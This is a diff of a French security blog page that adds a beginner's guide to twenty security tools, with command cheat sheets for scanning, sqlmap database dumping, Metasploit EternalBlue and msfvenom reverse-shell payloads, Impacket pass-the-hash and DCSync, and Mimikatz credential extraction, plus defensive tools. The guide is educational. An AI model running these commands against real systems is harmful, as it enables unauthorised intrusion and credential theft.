@@ -4,6 +4,15 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+<!-- ===== GOOGLE ANALYTICS ===== -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CRVR89FWBH"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-CRVR89FWBH');
+</script>
+
 <!-- ===== SEO ===== -->
 <title>Les 20 outils de cybersécurité indispensables en 2024 — Temgus.CyberBlog</title>
 <meta name="description" content="Nmap, Burp Suite, Metasploit, BloodHound, Volatility — guide pratique avec commandes essentielles.">
@@ -12,7 +21,7 @@
 <meta name="robots" content="index, follow">
 <link rel="canonical" href="https://temgus2025.github.io/temgus-cyberblog/pages/outils-securite-essentiels.html">
 
-<!-- ===== OPEN GRAPH (Facebook, LinkedIn) ===== -->
+<!-- ===== OPEN GRAPH ===== -->
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://temgus2025.github.io/temgus-cyberblog/pages/outils-securite-essentiels.html">
 <meta property="og:title" content="Les 20 outils de cybersécurité indispensables en 2024 — Temgus.CyberBlog">
@@ -28,7 +37,6 @@
 
 <!-- ===== TWITTER CARD ===== -->
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:site" content="@temgus">
 <meta name="twitter:title" content="Les 20 outils de cybersécurité indispensables en 2024 — Temgus.CyberBlog">
 <meta name="twitter:description" content="Nmap, Burp Suite, Metasploit, BloodHound, Volatility — guide pratique avec commandes essentielles.">
 <meta name="twitter:image" content="https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png">
@@ -41,22 +49,498 @@
   "headline": "Les 20 outils de cybersécurité indispensables en 2024",
   "description": "Nmap, Burp Suite, Metasploit, BloodHound, Volatility — guide pratique avec commandes essentielles.",
   "datePublished": "2025-08-23",
-  "author": {"@type": "Person", "name": "Temgus", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
-  "publisher": {"@type": "Person", "name": "Temgus"},
+  "author": {"@type": "Person", "name": "Derrick Temgoua", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
+  "publisher": {"@type": "Person", "name": "Derrick Temgoua"},
   "url": "https://temgus2025.github.io/temgus-cyberblog/pages/outils-securite-essentiels.html",
   "inLanguage": "fr",
   "keywords": "Nmap, Burp Suite, Metasploit, Wireshark, outils",
-  "timeRequired": "PT10M"
+  "timeRequired": "PT10M",
+  "image": "https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png"
 }
 </script>
 
+<!-- ===== STYLES ===== -->
+<link rel="stylesheet" href="../css/style.css">
+<link rel="stylesheet" href="../css/article.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+
+<style>
+  /* Styles spécifiques aux pages statiques */
+  .static-article-layout {
+    max-width: 860px;
+    margin: 100px auto 60px;
+    padding: 0 24px;
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    color: #c9d1d9;
+    line-height: 1.8;
+  }
+  .static-article-layout h1 {
+    color: #00d4ff;
+    font-size: 2rem;
+    margin-bottom: 12px;
+  }
+  .static-article-layout h2 {
+    color: #00d4ff;
+    font-size: 1.4rem;
+    margin-top: 40px;
+    border-left: 3px solid #00d4ff;
+    padding-left: 12px;
+  }
+  .static-article-layout h3 {
+    color: #7ee787;
+    font-size: 1.1rem;
+    margin-top: 24px;
+  }
+  .static-article-layout p { margin: 12px 0; }
+  .static-article-layout ul, .static-article-layout ol {
+    padding-left: 24px;
+    margin: 12px 0;
+  }
+  .static-article-layout li { margin: 6px 0; }
+  .static-article-layout pre {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    padding: 16px;
+    overflow-x: auto;
+    margin: 20px 0;
+  }
+  .static-article-layout code {
+    background: #161b22;
+    padding: 2px 6px;
+    border-radius: 4px;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    color: #e6edf3;
+  }
+  .static-article-layout pre code {
+    background: none;
+    padding: 0;
+  }
+  .static-article-layout strong { color: #e6edf3; }
+  .static-article-layout a { color: #00d4ff; }
+
+  .article-meta-banner {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 12px;
+    padding: 20px 24px;
+    margin-bottom: 32px;
+    display: flex;
+    gap: 20px;
+    align-items: center;
+    flex-wrap: wrap;
+  }
+  .article-meta-banner .icon { font-size: 40px; }
+  .meta-info { flex: 1; }
+  .meta-category {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 4px;
+  }
+  .meta-details {
+    color: #8892a4;
+    font-size: 13px;
+    margin-top: 8px;
+  }
+  .meta-details span { margin-right: 16px; }
+
+  .article-nav-links {
+    display: flex;
+    justify-content: space-between;
+    margin-top: 60px;
+    padding-top: 24px;
+    border-top: 1px solid #21262d;
+    gap: 12px;
+    flex-wrap: wrap;
+  }
+  .article-nav-links a {
+    color: #00d4ff;
+    text-decoration: none;
+    font-size: 14px;
+    max-width: 45%;
+  }
+  .article-nav-links a:hover { text-decoration: underline; }
+
+  .toc-box {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 8px;
+    padding: 16px 20px;
+    margin-bottom: 32px;
+  }
+  .toc-box h4 {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    margin: 0 0 12px;
+  }
+  .toc-list { list-style: none; padding: 0; margin: 0; }
+  .toc-list li { margin: 6px 0; }
+  .toc-list a { color: #8892a4; font-size: 14px; text-decoration: none; }
+  .toc-list a:hover { color: #00d4ff; }
+
+  .btn-read-original {
+    display: inline-block;
+    margin-top: 32px;
+    background: transparent;
+    border: 1px solid #00d4ff;
+    color: #00d4ff;
+    padding: 10px 20px;
+    border-radius: 8px;
+    text-decoration: none;
+    font-size: 14px;
+    transition: all 0.2s;
+  }
+  .btn-read-original:hover {
+    background: #00d4ff;
+    color: #060d1a;
+  }
+</style>
 </head>
-<body style="background:#060d1a;color:#fff;font-family:monospace;display:flex;align-items:center;justify-content:center;min-height:100vh;flex-direction:column;gap:20px;text-align:center;padding:40px">
-  <div style="font-size:48px">🧰</div>
-  <h1 style="color:#00d4ff;font-size:22px;max-width:600px">Les 20 outils de cybersécurité indispensables en 2024</h1>
-  <p style="color:#8892a4;max-width:500px">Nmap, Burp Suite, Metasploit, BloodHound, Volatility — guide pratique avec commandes essentielles.</p>
-  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#outils-securite-essentiels" style="background:#00d4ff;color:#060d1a;padding:12px 24px;border-radius:8px;text-decoration:none;font-weight:700">
-    Lire l'article →
+<body style="background:#060d1a">
+
+<canvas id="binary-canvas"></canvas>
+
+<!-- NAVBAR -->
+<nav id="navbar">
+  <a href="../index.html" class="logo">Temgus.<span>CyberBlog</span></a>
+  <ul class="nav-links">
+    <li><a href="../index.html">Accueil</a></li>
+    <li><a href="../index.html#articles" class="active">Articles</a></li>
+    <li><a href="../index.html#categories">Catégories</a></li>
+    <li><a href="../a-propos.html">À propos</a></li>
+  </ul>
+  <a href="../index.html" class="btn-outline" style="font-size:13px;padding:7px 16px">← Retour</a>
+</nav>
+
+<!-- ARTICLE COMPLET -->
+<main class="static-article-layout">
+
+  <!-- Bannière méta -->
+  <div class="article-meta-banner">
+    <div class="icon">🧰</div>
+    <div class="meta-info">
+      <div class="meta-category">Outils & Logiciels</div>
+      <div style="color:#e6edf3;font-size:18px;font-weight:600">Les 20 outils de cybersécurité indispensables en 2024</div>
+      <div class="meta-details">
+        <span>📅 2025-08-23</span>
+        <span>⏱ 10 min de lecture</span>
+        <span>🏷 Débutant</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Table des matières -->
+  <div class="toc-box"><h4>// SOMMAIRE</h4><ul class="toc-list"><li><a href="#reconnaissance-et-osint">Reconnaissance et OSINT</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#nmap-le-scanner-r-seau-universel">Nmap — Le scanner réseau universel</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#shodan-moteur-de-recherche-iot-ot">Shodan — Moteur de recherche IoT/OT</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#subfinder-httpx-d-couverte-de-sous-domaines">Subfinder + httpx — Découverte de sous-domaines</a></li>
+<li><a href="#tests-web">Tests Web</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#burp-suite-proxy-d-interception">Burp Suite — Proxy d'interception</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#sqlmap-automatiser-les-injections-sql">SQLmap — Automatiser les injections SQL</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#ffuf-fuzzer-rapide">ffuf — Fuzzer rapide</a></li>
+<li><a href="#exploitation">Exploitation</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#metasploit-framework">Metasploit Framework</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#impacket-suite-d-outils-ad">Impacket — Suite d'outils AD</a></li>
+<li><a href="#active-directory">Active Directory</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#bloodhound-cartographie-ad">BloodHound — Cartographie AD</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#mimikatz-extraction-de-credentials">Mimikatz — Extraction de credentials</a></li>
+<li><a href="#d-fense-et-monitoring">Défense et monitoring</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#wireshark-analyse-de-trafic">Wireshark — Analyse de trafic</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#volatility-forensics-m-moire">Volatility — Forensics mémoire</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#lynis-audit-syst-me-linux">Lynis — Audit système Linux</a></li>
+<li><a href="#r-capitulatif-par-phase">Récapitulatif par phase</a></li>
+<li><a href="#conclusion">Conclusion</a></li></ul></div>
+
+  <!-- Contenu de l'article -->
+  <article><h1>Les 20 outils de cybersécurité indispensables en 2024</h1>
+
+<p>La cybersécurité dispose d'un arsenal d'outils considérable. Ce guide présente les 20 outils les plus importants, organisés par domaine, avec les commandes essentielles pour démarrer rapidement.</p>
+
+<h2 id="reconnaissance-et-osint">Reconnaissance et OSINT</h2>
+
+<h3 id="nmap-le-scanner-r-seau-universel">Nmap — Le scanner réseau universel</h3>
+<pre><code class="language-bash"># Scan rapide
+<p>nmap -sn 192.168.1.0/24              # Ping scan (hôtes actifs)</p>
+<p>nmap -sV -sC -p- 192.168.1.100       # Scan complet avec scripts</p>
+<p>nmap -A --min-rate 5000 192.168.1.100 # Scan agressif rapide</p>
+<p>nmap -sU --top-ports 100 192.168.1.100 # Ports UDP</p>
+
+<h1>Formats de sortie</h1>
+<p>nmap -oA scan_results 192.168.1.0/24  # Tous les formats</p>
+<p>nmap -oX scan.xml 192.168.1.100       # XML pour import dans d'autres outils</code></pre>
+
+<h3 id="shodan-moteur-de-recherche-iot-ot">Shodan — Moteur de recherche IoT/OT</h3>
+<pre><code class="language-bash"># Recherches utiles (site : shodan.io)
+<h1>port:22 country:FR city:Paris      → SSH en France</h1>
+<h1>org:"OVH SAS" port:3389            → RDP chez OVH</h1>
+<h1>vuln:CVE-2021-44228                → Serveurs Log4Shell vulnérables</h1>
+<h1>"MongoDB Server Information"       → MongoDB sans auth</h1>
+
+<h1>API Shodan</h1>
+<p>pip install shodan</p>
+<p>shodan init YOUR_API_KEY</p>
+<p>shodan host 8.8.8.8</p>
+<p>shodan search "apache 2.2" --limit 100</code></pre>
+
+<h3 id="subfinder-httpx-d-couverte-de-sous-domaines">Subfinder + httpx — Découverte de sous-domaines</h3>
+<pre><code class="language-bash"># Trouver les sous-domaines
+<p>subfinder -d target.com -o subs.txt</p>
+<p>amass enum -passive -d target.com &gt;&gt; subs.txt</p>
+<p>assetfinder target.com &gt;&gt; subs.txt</p>
+
+<h1>Filtrer les actifs</h1>
+<p>cat subs.txt | sort -u | httpx -silent -status-code -title -o actifs.txt</code></pre>
+
+<h2 id="tests-web">Tests Web</h2>
+
+<h3 id="burp-suite-proxy-d-interception">Burp Suite — Proxy d'interception</h3>
+<pre><code>Fonctionnalités clés :
+<p>→ Proxy : Intercepter et modifier les requêtes HTTP</p>
+<p>→ Repeater : Rejouer et modifier des requêtes</p>
+<p>→ Intruder : Fuzzing et brute force</p>
+<p>→ Scanner (Pro) : Scan automatique de vulnérabilités</p>
+<p>→ Collaborator : SSRF, XXE, SSTI out-of-band</p>
+
+<p>Extensions indispensables :</p>
+<p>→ Param Miner : découvrir les paramètres cachés</p>
+<p>→ HTTP Request Smuggler : tester le request smuggling</p>
+<p>→ JWT Editor : manipuler les tokens JWT</p>
+<p>→ Active Scan++ : scanner amélioré</code></pre>
+
+<h3 id="sqlmap-automatiser-les-injections-sql">SQLmap — Automatiser les injections SQL</h3>
+<pre><code class="language-bash"># Test basique
+<p>sqlmap -u "http://target.com/page?id=1"</p>
+
+<h1>POST request</h1>
+<p>sqlmap -u "http://target.com/login" --data="user=admin&amp;pass=test"</p>
+
+<h1>Avec authentification</h1>
+<p>sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"</p>
+
+<h1>Options avancées</h1>
+<p>sqlmap -u "http://target.com/page?id=1" \</p>
+<p>--level=5 --risk=3 \</p>
+<p>--dbms=mysql \</p>
+<p>--dump-all \          # Dumper toutes les BDD</p>
+<p>--batch               # Mode non-interactif</code></pre>
+
+<h3 id="ffuf-fuzzer-rapide">ffuf — Fuzzer rapide</h3>
+<pre><code class="language-bash"># Découvrir des chemins cachés
+<p>ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target.com/FUZZ</p>
+
+<h1>Fuzzer des paramètres</h1>
+<p>ffuf -w params.txt -u "http://target.com/page?FUZZ=test"</p>
+
+<h1>Brute force de sous-domaines</h1>
+<p>ffuf -w subdomains.txt -u http://FUZZ.target.com -H "Host: FUZZ.target.com"</p>
+
+<h1>Filtrer les résultats</h1>
+<p>ffuf -w wordlist.txt -u http://target.com/FUZZ \</p>
+<p>-fc 404,403 \          # Filtrer codes 404, 403</p>
+<p>-fs 1234 \             # Filtrer par taille</p>
+<p>-o results.json</code></pre>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<h3 id="metasploit-framework">Metasploit Framework</h3>
+<pre><code class="language-bash">msfconsole
+
+<h1>Chercher un exploit</h1>
+<p>search type:exploit name:eternalblue</p>
+<p>search cve:2021-44228</p>
+
+<h1>Utiliser un exploit</h1>
+<p>use exploit/windows/smb/ms17_010_eternalblue</p>
+<p>set RHOSTS 192.168.1.100</p>
+<p>set LHOST 192.168.1.50</p>
+<p>show options</p>
+<p>exploit</p>
+
+<h1>Générer des payloads</h1>
+<p>msfvenom -p windows/x64/meterpreter/reverse_tcp \</p>
+<p>LHOST=192.168.1.50 LPORT=4444 \</p>
+<p>-f exe -o payload.exe</p>
+
+<h1>Listener</h1>
+<p>use exploit/multi/handler</p>
+<p>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code></pre>
+
+<h3 id="impacket-suite-d-outils-ad">Impacket — Suite d'outils AD</h3>
+<pre><code class="language-bash"># Pass-the-Hash
+<p>psexec.py -hashes :NTLM_HASH DOMAIN/Administrator@192.168.1.1</p>
+
+<h1>DCSync</h1>
+<p>secretsdump.py DOMAIN/admin:password@192.168.1.1</p>
+
+<h1>Kerberoasting</h1>
+<p>GetUserSPNs.py DOMAIN/user:password -dc-ip 192.168.1.1 -request</p>
+
+<h1>SMBclient</h1>
+<p>smbclient.py DOMAIN/user:password@192.168.1.1</code></pre>
+
+<h2 id="active-directory">Active Directory</h2>
+
+<h3 id="bloodhound-cartographie-ad">BloodHound — Cartographie AD</h3>
+<pre><code class="language-powershell"># Collecte (SharpHound sur Windows)
+<p>SharpHound.exe -c All --outputdirectory C:\Temp</p>
+
+<h1>Ou avec Python (depuis Linux)</h1>
+<p>bloodhound-python -u user -p password -d DOMAIN -ns 192.168.1.1 -c all</p>
+
+<h1>Dans BloodHound GUI :</h1>
+<h1>→ "Shortest path to Domain Admins"</h1>
+<h1>→ "Find all Domain Admins"</h1>
+<h1>→ "Computers where Domain Users are Local Admins"</h1>
+<h1>→ Kerberoastable Accounts</code></pre></h1>
+
+<h3 id="mimikatz-extraction-de-credentials">Mimikatz — Extraction de credentials</h3>
+<pre><code>sekurlsa::logonpasswords     # Mots de passe en clair depuis LSASS
+<p>sekurlsa::wdigest            # WDigest credentials</p>
+<p>lsadump::sam                 # Hashes SAM</p>
+<p>lsadump::dcsync /user:krbtgt # DCSync</p>
+<p>kerberos::golden             # Golden Ticket</p>
+<p>privilege::debug             # Élever les privilèges</code></pre>
+
+<h2 id="d-fense-et-monitoring">Défense et monitoring</h2>
+
+<h3 id="wireshark-analyse-de-trafic">Wireshark — Analyse de trafic</h3>
+<pre><code>Filtres essentiels :
+<p>http                          → Tout le trafic HTTP</p>
+<p>http.request.method == "POST" → Formulaires</p>
+<p>dns.qry.name contains "evil"  → Requêtes DNS suspectes</p>
+<p>tcp.flags.syn == 1            → Connexions SYN</p>
+<p>ip.addr == 192.168.1.100      → Trafic d'une IP</p>
+<p>!(arp or dns or icmp)         → Sans le bruit</code></pre>
+
+<h3 id="volatility-forensics-m-moire">Volatility — Forensics mémoire</h3>
+<pre><code class="language-bash"># Identifier le profil
+<p>vol3 -f memory.dmp windows.info</p>
+
+<h1>Processus</h1>
+<p>vol3 -f memory.dmp windows.pslist</p>
+<p>vol3 -f memory.dmp windows.pstree</p>
+
+<h1>Réseau</h1>
+<p>vol3 -f memory.dmp windows.netscan</p>
+
+<h1>Malwares</h1>
+<p>vol3 -f memory.dmp windows.malfind</p>
+<p>vol3 -f memory.dmp windows.dlllist --pid 1234</code></pre>
+
+<h3 id="lynis-audit-syst-me-linux">Lynis — Audit système Linux</h3>
+<pre><code class="language-bash">lynis audit system           # Audit complet
+<p>lynis show details           # Détails d'une vérification</p>
+<p>lynis audit system --tests-from-group authentication</code></pre>
+
+<h2 id="r-capitulatif-par-phase">Récapitulatif par phase</h2>
+
+<pre><code>Reconnaissance :
+<p>→ Nmap, Shodan, Subfinder, theHarvester, Amass</p>
+
+<p>Exploitation Web :</p>
+<p>→ Burp Suite, SQLmap, ffuf, Nikto, XSSer</p>
+
+<p>Exploitation Réseau/AD :</p>
+<p>→ Metasploit, Impacket, BloodHound, Mimikatz, Rubeus</p>
+
+<p>Post-exploitation :</p>
+<p>→ Cobalt Strike/Sliver (C2), Chisel (pivoting), CrackMapExec</p>
+
+<p>Défense/Forensics :</p>
+<p>→ Wireshark, Volatility, Autopsy, Lynis, Auditd</p>
+
+<p>OSINT :</p>
+<p>→ Maltego, SpiderFoot, theHarvester, Recon-ng</code></pre>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>Ces 20 outils constituent la boîte à outils essentielle de tout professionnel en cybersécurité. La maîtrise de ces outils combinée à une solide compréhension des protocoles et des systèmes vous permettra d'aborder efficacement n'importe quelle mission de sécurité offensive ou défensive.</p>
+
+<p>---</p>
+<p><em>Catégorie : Outils & Logiciels</em></p>
+</article>
+
+  <!-- Lien vers la version interactive -->
+  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#outils-securite-essentiels" class="btn-read-original">
+    💬 Voir l'article avec commentaires →
   </a>
+
+  <!-- Navigation précédent / suivant -->
+  <div class="article-nav-links">
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/pentest-web-avance.html" class="nav-prev">← Pentest Web avancé : au-delà de l'OWASP Top 10</a>
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/actualites-cyber-2024.html" class="nav-next">Cybersécurité 2024 : les incidents majeurs de l'année →</a>
+  </div>
+
+</main>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-inner">
+    <div>
+      <div class="footer-logo">Temgus.<span>CyberBlog</span></div>
+      <div class="footer-copy">© 2025 Temgus — Tous droits réservés</div>
+    </div>
+    <div class="footer-links">
+      <a href="../mentions-legales.html">Mentions légales</a>
+      <a href="../a-propos.html">Contact</a>
+      <a href="https://github.com/temgus2025" target="_blank">GitHub</a>
+    </div>
+  </div>
+</footer>
+
+<!-- Coloration syntaxique -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+  // Highlight.js
+  document.addEventListener('DOMContentLoaded', () => {
+    document.querySelectorAll('pre code').forEach(el => hljs.highlightElement(el));
+  });
+
+  // Animation binaire (depuis style.css / app.js existant)
+  const canvas = document.getElementById('binary-canvas');
+  if (canvas) {
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    const cols = Math.floor(canvas.width / 14);
+    const drops = Array(cols).fill(1);
+    function drawBinary() {
+      ctx.fillStyle = 'rgba(6,13,26,0.05)';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = 'rgba(0,212,255,0.15)';
+      ctx.font = '12px monospace';
+      drops.forEach((y, i) => {
+        ctx.fillText(Math.random() > 0.5 ? '1' : '0', i * 14, y * 14);
+        if (y * 14 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+      });
+    }
+    setInterval(drawBinary, 50);
+    window.addEventListener('resize', () => {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    });
+  }
+
+  // Navbar scroll
+  window.addEventListener('scroll', () => {
+    const nav = document.getElementById('navbar');
+    if (nav) nav.classList.toggle('scrolled', window.scrollY > 50);
+  });
+
+  // Smooth scroll pour le sommaire
+  document.querySelectorAll('.toc-list a').forEach(a => {
+    a.addEventListener('click', e => {
+      e.preventDefault();
+      const target = document.querySelector(a.getAttribute('href'));
+      if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    });
+  });
+</script>
+
 </body>
 </html>
